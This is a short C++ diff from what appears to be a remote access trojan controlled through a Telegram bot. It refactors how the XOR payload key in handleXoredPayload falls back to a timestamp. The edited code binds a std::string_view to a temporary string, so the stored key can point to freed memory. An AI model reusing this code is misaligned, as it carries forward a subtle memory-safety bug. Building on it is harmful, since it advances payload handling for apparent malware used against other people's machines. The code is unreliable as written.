@@ -84,10 +84,11 @@ void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
 		};
 
 		key = trim_view(key);
-		std::string_view key_str =
-		    key.empty() ? ::rat::system::getCurrentDateTime_Underscored()
-		                : std::string(key);
 
+		std::string_view key_str = key;
+			if(key.empty()) {
+				key_str = ::rat::system::getCurrentDateTime_Underscored();
+			};
 		this->state.payload_key = key_str;
 	}
 	{
